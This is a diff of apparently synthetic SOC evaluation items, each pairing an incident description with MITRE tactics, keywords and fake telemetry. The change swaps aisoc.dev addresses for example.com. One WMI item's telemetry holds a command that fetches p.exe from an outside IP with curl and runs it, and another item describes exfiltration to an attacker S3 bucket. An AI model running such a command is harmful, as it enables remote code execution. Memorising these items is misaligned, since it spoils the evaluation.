         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 5145,
         "Computer": "WIN-FILE-SHARE",
-        "SubjectUserName": "svc-deploy@aisoc.dev",
+        "SubjectUserName": "svc-deploy@example.com",
         "ShareName": "\\\\*\\*",
         "IpAddress": "LIN-DB-REPLICA",
         "EventCount": 256
@@ -8840,7 +8840,7 @@
     "template_id": "pass-the-hash-lateral",
     "template_index": 27,
     "title": "Pass-the-hash from WIN-EXCHANGE-01 to AWS-EC2-PROD-API",
-    "description": "Pass-the-hash lateral movement from WIN-EXCHANGE-01 to AWS-EC2-PROD-API by ops-lead@aisoc.dev. Golden ticket indicators present. Linked to Lazarus.",
+    "description": "Pass-the-hash lateral movement from WIN-EXCHANGE-01 to AWS-EC2-PROD-API by ops-lead@example.com. Golden ticket indicators present. Linked to Lazarus.",
     "expected_tactics": [
       "TA0008",
       "TA0006"
@@ -8856,7 +8856,7 @@
       "golden ticket",
       "WIN-EXCHANGE-01",
       "AWS-EC2-PROD-API",
-      "ops-lead@aisoc.dev",
+      "ops-lead@example.com",
       "Lazarus"
     ],
     "telemetry": [
@@ -8866,7 +8866,7 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 4624,
         "Computer": "AWS-EC2-PROD-API",
-        "TargetUserName": "ops-lead@aisoc.dev",
+        "TargetUserName": "ops-lead@example.com",
         "LogonType": 3,
         "AuthenticationPackageName": "NTLM",
         "IpAddress": "WIN-EXCHANGE-01",
@@ -8878,7 +8878,7 @@
         "severity": "high",
         "Computer": "AWS-EC2-PROD-API",
         "Source": "WIN-EXCHANGE-01",
-        "User": "ops-lead@aisoc.dev",
+        "User": "ops-lead@example.com",
         "threat_actor": "Lazarus"
       }
     ]
@@ -8888,7 +8888,7 @@
     "template_id": "rdp-lateral-movement",
     "template_index": 28,
     "title": "RDP lateral movement from WIN-DEVOPS-LT",
-    "description": "Anomalous RDP session from WIN-DEVOPS-LT (eve@aisoc.dev) to MAC-CFO-LAPTOP outside business hours. Source admin not normal for MAC-CFO-LAPTOP.",
+    "description": "Anomalous RDP session from WIN-DEVOPS-LT (eve@example.com) to MAC-CFO-LAPTOP outside business hours. Source admin not normal for MAC-CFO-LAPTOP.",
     "expected_tactics": [
       "TA0008"
     ],
@@ -8903,7 +8903,7 @@
       "outside hours",
       "WIN-DEVOPS-LT",
       "MAC-CFO-LAPTOP",
-      "eve@aisoc.dev"
+      "eve@example.com"
     ],
     "telemetry": [
       {
@@ -8912,7 +8912,7 @@
         "Provider": "Microsoft-Windows-Security-Auditing",
         "EventID": 4624,
         "Computer": "MAC-CFO-LAPTOP",
-        "TargetUserName": "eve@aisoc.dev",
+        "TargetUserName": "eve@example.com",
         "LogonType": 10,
         "IpAddress": "WIN-DEVOPS-LT",
         "LogonProcessName": "User32",
@@ -8925,7 +8925,7 @@
     "template_id": "wmi-lateral-execution",
     "template_index": 29,
     "title": "WMI lateral execution from WIN-FILE-SHARE to LIN-DB-REPLICA",
-    "description": "wmic.exe /node:LIN-DB-REPLICA process call create observed from WIN-FILE-SHARE by svc-backup@aisoc.dev. Remote command execution; payload from 91.134.231.15.",
+    "description": "wmic.exe /node:LIN-DB-REPLICA process call create observed from WIN-FILE-SHARE by svc-backup@example.com. Remote command execution; payload from 91.134.231.15.",
     "expected_tactics": [
       "TA0008",
       "TA0002"
@@ -8940,7 +8940,7 @@
       "lateral",
       "WIN-FILE-SHARE",
       "LIN-DB-REPLICA",
-      "svc-backup@aisoc.dev",
+      "svc-backup@example.com",
       "91.134.231.15"
     ],
     "telemetry": [
@@ -8950,7 +8950,7 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 1,
         "Computer": "WIN-FILE-SHARE",
-        "User": "svc-backup@aisoc.dev",
+        "User": "svc-backup@example.com",
         "Image": "C:\\Windows\\System32\\wbem\\wmic.exe",
         "CommandLine": "wmic /node:LIN-DB-REPLICA process call create \"cmd /c curl http://91.134.231.15/p.exe -o C:\\Users\\Public\\p.exe && C:\\Users\\Public\\p.exe\""
       }
@@ -8960,8 +8960,8 @@
     "id": "INC-EVAL-196",
     "template_id": "bulk-pii-download",
     "template_index": 30,
-    "title": "Bulk PII download by cfo@aisoc.dev",
-    "description": "cfo@aisoc.dev downloaded >10 GB of customer records from production database from LIN-K8S-NODE01. Outside normal access pattern.",
+    "title": "Bulk PII download by cfo@example.com",
+    "description": "cfo@example.com downloaded >10 GB of customer records from production database from LIN-K8S-NODE01. Outside normal access pattern.",
     "expected_tactics": [
       "TA0009",
       "TA0010"
@@ -8977,13 +8977,13 @@
       "pii",
       "customer record",
       "LIN-K8S-NODE01",
-      "cfo@aisoc.dev"
+      "cfo@example.com"
     ],
     "telemetry": [
       {
         "source": "db_audit",
         "operation": "SELECT",
-        "user": "cfo@aisoc.dev",
+        "user": "cfo@example.com",
         "src_host": "LIN-K8S-NODE01",
         "database": "prod_customers",
         "table": "customer_records",
@@ -8997,7 +8997,7 @@
     "template_id": "clipboard-keylogger",
     "template_index": 31,
     "title": "Clipboard logging implant on WIN-PROD-WEB02",
-    "description": "Clipboard contents from WIN-PROD-WEB02 (heidi@aisoc.dev) being captured to %APPDATA%\\Local\\. Captures span 2 hours and include credentials and crypto addresses.",
+    "description": "Clipboard contents from WIN-PROD-WEB02 (heidi@example.com) being captured to %APPDATA%\\Local\\. Captures span 2 hours and include credentials and crypto addresses.",
     "expected_tactics": [
       "TA0009"
     ],
@@ -9011,7 +9011,7 @@
       "keylog",
       "credentials",
       "WIN-PROD-WEB02",
-      "heidi@aisoc.dev"
+      "heidi@example.com"
     ],
     "telemetry": [
       {
@@ -9020,8 +9020,8 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 24,
         "Computer": "WIN-PROD-WEB02",
-        "User": "heidi@aisoc.dev",
-        "Image": "C:\\Users\\heidi@aisoc.dev\\AppData\\Local\\sched.exe",
+        "User": "heidi@example.com",
+        "Image": "C:\\Users\\heidi@example.com\\AppData\\Local\\sched.exe",
         "Hashes": "SHA256=abc..."
       },
       {
@@ -9030,9 +9030,9 @@
         "Provider": "Microsoft-Windows-Sysmon",
         "EventID": 11,
         "Computer": "WIN-PROD-WEB02",
-        "Image": "C:\\Users\\heidi@aisoc.dev\\AppData\\Local\\sched.exe",
-        "TargetFilename": "C:\\Users\\heidi@aisoc.dev\\AppData\\Local\\clip.log",
-        "User": "heidi@aisoc.dev"
+        "Image": "C:\\Users\\heidi@example.com\\AppData\\Local\\sched.exe",
+        "TargetFilename": "C:\\Users\\heidi@example.com\\AppData\\Local\\clip.log",
+        "User": "heidi@example.com"
       }
     ]
   },
@@ -9077,7 +9077,7 @@
     "template_id": "s3-exfil-cloud-storage",
     "template_index": 33,
     "title": "Cloud storage exfil: data egress to attacker-controlled S3 from K8S-PROD-CLUSTER",
-    "description": "Egress from K8S-PROD-CLUSTER to s3://atk-stage-45.142.122.111/dump/ by alice@aisoc.dev. 8 GB transferred over 20 minutes. CloudTrail PutObject events match.",
+    "description": "Egress from K8S-PROD-CLUSTER to s3://atk-stage-45.142.122.111/dump/ by alice@example.com. 8 GB transferred over 20 minutes. CloudTrail PutObject events match.",
     "expected_tactics": [
       "TA0010"
     ],
@@ -9093,7 +9093,7 @@
       "exfiltrat",
       "K8S-PROD-CLUSTER",
       "45.142.122.111",
-      "alice@aisoc.dev"
+      "alice@example.com"
     ],
     "telemetry": [
       {
@@ -9103,7 +9103,7 @@
         "awsRegion": "us-east-1",
         "userIdentity": {
           "type": "IAMUser",
-          "userName": "alice@aisoc.dev"
+          "userName": "alice@example.com"
         },
         "sourceIPAddress": "K8S-PROD-CLUSTER",
         "requestParameters": {
@@ -9122,8 +9122,8 @@
     "id": "INC-EVAL-200",
     "template_id": "personal-drive-exfil",
     "template_index": 34,
-    "title": "Personal Drive exfil by grace@aisoc.dev",
-    "description": "grace@aisoc.dev on LIN-K8S-NODE01 uploaded 4 GB to personal Google Drive. Files include source code and customer PII.",
+    "title": "Personal Drive exfil by grace@example.com",
+    "description": "grace@example.com on LIN-K8S-NODE01 uploaded 4 GB to personal Google Drive. Files include source code and customer PII.",
     "expected_tactics": [
       "TA0009",
       "TA0010"
@@ -9141,7 +9141,7 @@
       "source code",
       "pii",
       "LIN-K8S-NODE01",
-      "grace@aisoc.dev"
+      "grace@example.com"
     ],
     "telemetry": [
       {
@@ -9150,7 +9150,7 @@
         "url": "https://www.googleapis.com/upload/drive/v3/files",
         "status_code": 200,
         "src_host": "LIN-K8S-NODE01",
-        "src_user": "grace@aisoc.dev",
+        "src_user": "grace@example.com",
         "bytes_out": 4300000000,
         "file_count": 812
       }
